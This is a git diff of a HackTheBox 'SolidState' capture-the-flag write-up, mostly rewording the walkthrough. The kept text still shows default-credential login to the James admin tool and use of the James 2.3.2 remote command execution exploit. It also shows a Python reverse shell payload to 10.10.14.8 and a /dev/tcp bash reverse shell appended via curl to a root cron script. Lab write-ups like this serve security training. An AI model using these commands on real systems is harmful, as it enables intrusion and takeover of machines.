@@ -81,19 +81,13 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 262.85 seconds
 ```
 
-Lets check out their website first.
+Here is their website.
 
 ![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/SolidState/website.png?raw=true)
 
-Looks like a nice website.
-
 ![website_services](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/SolidState/website_services.png?raw=true)
 
-It seems like there’s a services webpage where you can submit a message.
-
-However, intercepting this submit request on Burp shows nothing interesting.
-
-Lets run a `gobuster` scan to check if we missed anything out.
+There is a services webpage where you can submit a message. However, intercepting this submit request on Burp showed nothing interesting.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
@@ -108,11 +102,11 @@ Lets run a `gobuster` scan to check if we missed anything out.
 ...
 ```
 
-Hmm.. looks like there’s nothing much here. Lets move on then.
+`gobuster` scan showed nothing much too.
 
 Based on the `nmap` results, there seems to be a James Mail Server listening on four different ports - `SMTP 25, POP3 110, NNTP 119 & 4555`.
 
-Since the `nmap` results also showed that there is some login functionality on port `4555`, lets check it out first!
+Since the `nmap` results also showed that there is some login functionality on port `4555`, we can check that out first.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro]
@@ -123,9 +117,7 @@ JAMES Remote Administration Tool 2.3.2
 Please enter your login and password
 ```
 
-It seems like we need some credentials to login. Lets Google for the default credentials using `JAMES Remote Administration Tool default credentials`.
-
-It seems that the default credentials are `root:root`!
+It seems like we need some credentials to login. Googling for `JAMES Remote Administration Tool default credentials` resulted in the credentials `root:root`.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro]
@@ -159,7 +151,7 @@ shutdown                                kills the current JVM (convenient when J
 quit                                    close connection
 ```
 
-Lets list out the users!
+Lets list out the users.
 
 ```bash
 listusers
@@ -171,9 +163,7 @@ user: mindy
 user: mailadmin
 ```
 
-It seems like there are 5 users.
-
-Since we are the admin, we can probably change the password for all of these users! OwO
+It seems like there are 5 users. We can probably change the password for all of these users since we are admin.
 
 ```bash
 setpassword james password
@@ -190,18 +180,7 @@ Password for mailadmin reset
 
 # Exploitation
 
-Now lets take a look at port `110`.
-
-```bash
-┌──(root㉿shiro)-[/home/shiro]
-└─# telnet 10.10.10.51 110
-Trying 10.10.10.51...
-Connected to 10.10.10.51.
-Escape character is '^]'.
-+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
-```
-
-Great, it works! Lets try logging in as `james`! 
+Now lets take a look at port `110` and login as `james`. 
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro]
@@ -219,9 +198,9 @@ list
 .
 ```
 
-It seems like there’s nothing much for `james` so lets try `thomas`!
-
 >   You can escape the telnet terminal by using `^]`, followed by `quit`.
+
+There’s nothing much for `james` so lets try `thomas`.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro]
@@ -239,7 +218,7 @@ list
 .
 ```
 
-It seems like there’s nothing much for `thomas` as well. Lets try `john` then.
+There’s also nothing much for `thomas` as well. Lets try `john`.
 
 ```bash
 USER john
@@ -350,12 +329,12 @@ James
 .
 ```
 
-Oh? There’s a SSH credential in the email for `mindy`! We should probably take note of this.
+There’s a SSH credential in the email for `mindy`. 
 
-Before we move on, we should check out `mailadmin`'s account.
+Before we move on, we should also check `mailadmin`'s account.
 
 ```bash
-──(root㉿shiro)-[/home/shiro]
+┌──(root㉿shiro)-[/home/shiro]
 └─# telnet 10.10.10.51 110
 Trying 10.10.10.51...
 Connected to 10.10.10.51.
@@ -370,18 +349,13 @@ list
 .
 ```
 
-Wow.. there was nothing for `mailadmin`. :(
+Nothing useful.
 
-Finally, lets try to ssh into the system as `mindy`.
+We can now SSH as `mindy` with her credentials.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
-└─# ssh mindy@10.10.10.51                                                   
-The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
-ED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg.
-This key is not known by any other names
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.10.51' (ED25519) to the list of known hosts.
+└─# ssh mindy@10.10.10.51                                                 ...
 mindy@10.10.10.51's password: P@55W0rd1!2@
 ...
 mindy@solidstate:~$ whoami
@@ -411,17 +385,14 @@ Lets check if there is any known exploits for James Mail Server.
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
 └─# searchsploit james 2.3.2                   
------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------- ---------------------------------
+...
 Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit | linux/remote/48130.rb
 Apache James Server 2.3.2 - Remote Command Execution                                | linux/remote/35513.py
 Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)      | linux/remote/50347.py
------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
+...
 ```
 
-It looks like there are some vulnerabilities! Lets check out `Apache James Server 2.3.2 - Remote Command Execution` as that seems to be the most applicable one.
+Lets check out `Apache James Server 2.3.2 - Remote Command Execution` as that seems to be the most applicable one.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
@@ -451,61 +422,10 @@ payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on 
 # credentials to James Remote Administration Tool (Default - root/root)
 user = 'root'
 pwd = 'root'
-
-if len(sys.argv) != 2:
-    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
-    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
-    sys.exit(1)
-
-ip = sys.argv[1]
-
-def recv(s):
-        s.recv(1024)
-        time.sleep(0.2)
-
-try:
-    print "[+]Connecting to James Remote Administration Tool..."
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip,4555))
-    s.recv(1024)
-    s.send(user + "\n")
-    s.recv(1024)
-    s.send(pwd + "\n")
-    s.recv(1024)
-    print "[+]Creating user..."
-    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
-    s.recv(1024)
-    s.send("quit\n")
-    s.close()
-
-    print "[+]Connecting to James SMTP server..."
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip,25))
-    s.send("ehlo team@team.pl\r\n")
-    recv(s)
-    print "[+]Sending payload..."
-    s.send("mail from: <'@team.pl>\r\n")
-    recv(s)
-    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
-    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
-    recv(s)
-    s.send("data\r\n")
-    recv(s)
-    s.send("From: team@team.pl\r\n")
-    s.send("\r\n")
-    s.send("'\n")
-    s.send(payload + "\n")
-    s.send("\r\n.\r\n")
-    recv(s)
-    s.send("quit\r\n")
-    recv(s)
-    s.close()
-    print "[+]Done! Payload will be executed once somebody logs in."
-except:
-    print "Connection failed." 
+...
 ```
 
-To use this payload, we can just edit the payload part to execute a Python reverse shell! OwO
+To use this payload, we can just edit the payload part to execute a Python reverse shell!
 
 ```python
 payload = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
@@ -523,10 +443,9 @@ Finally, we can execute the script!
 [+]Done! Payload will be executed once somebody logs in.
 ```
 
-Great! Now, we just have to start a netcat listener and log in as an existing user.
+Now, we just have to start a netcat listener and log in as an `mindy` to execute the payload.
 
 ```bash
-- Trying to SSH as mindy -
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
 └─# ssh mindy@10.10.10.51                      
 mindy@10.10.10.51's password: P@55W0rd1!2@
@@ -551,21 +470,12 @@ From: team@team.pl
 └─# nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.8] from (UNKNOWN) [10.10.10.51] 48670
-${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
-whoami
-mindy
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
 ```
 
 # Privilege Escalation
 
-Lets use Linpeas to check if there’s any interesting files on the system.
-
 ```bash
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
-└─# python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.51 - - [09/May/2022 15:50:29] "GET /linpeas.sh HTTP/1.1" 200 -
-
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ wget http://10.10.14.8/linpeas.sh
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ chmod +x linpeas.sh
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ./linpeas.sh
@@ -579,7 +489,7 @@ drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
 ...
 ```
 
-It looks like there is an interesting `tmp.py` file in `/opt/`.
+`Linpeas` showed an interesting `tmp.py` file in `/opt/`.
 
 ```bash
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/tmp.py
@@ -592,38 +502,12 @@ except:
      sys.exit()
 ```
 
-Lets use `pspy` to check if the `tmp.py` is being executed on the system.
+Lets use `pspy` to check if `tmp.py` is being executed on the system.
 
 ```bash
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
-└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
-
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
-└─# python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.51 - - [09/May/2022 15:59:53] code 404, message File not found
-10.10.10.51 - - [09/May/2022 15:59:58] "GET /pspy32 HTTP/1.1" 200 -
-
-
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ wget http://10.10.14.8/pspy32
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ chmod +x pspy32
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ./pspy32 
-pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
-
-
-     ██▓███    ██████  ██▓███ ▓██   ██▓
-    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
-    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
-    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
-    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
-    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
-    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
-    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
-                   ░           ░ ░     
-                               ░ ░     
-
-Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
-Draining file system events due to startup...
 ...
 2022/05/09 04:03:01 CMD: UID=0    PID=1716   | /bin/sh -c python /opt/tmp.py 
 2022/05/09 04:03:01 CMD: UID=0    PID=1717   | python /opt/tmp.py 
@@ -639,20 +523,13 @@ Draining file system events due to startup...
 ...
 ```
 
-Hmm.. it looks like the `tmp.py` script is executed by root every 3 minutes!
-
-Lets modify the script with a reverse shell code at the end of the file!
+It looks like the `tmp.py` script is executed by root every 3 minutes! We can add a reverse shell code at the end of the file!
 
 ```bash
 - Local machine -
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
 └─# cat py_revshell  
 os.system("bash -c 'exec bash -i &>/dev/tcp/10.10.14.8/9999 <&1'")
-                                             
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
-└─# python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.51 - - [09/May/2022 16:13:51] "GET /py_revshell HTTP/1.1" 200 -
 
 - mindy's SSH -
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ curl http://10.10.14.8/py_revshell >> tmp.py
@@ -674,9 +551,7 @@ Finally, we start a netcat listener and wait for the `tmp.py` script to be execu
 └─# nc -nlvp 9999                                                              
 listening on [any] 9999 ...
 connect to [10.10.14.8] from (UNKNOWN) [10.10.10.51] 40852
-bash: cannot set terminal process group (1746): Inappropriate ioctl for device
-bash: no job control in this shell
-
+...
 root@solidstate:~# whoami
 root
 root@solidstate:~# cat /root/root.txt
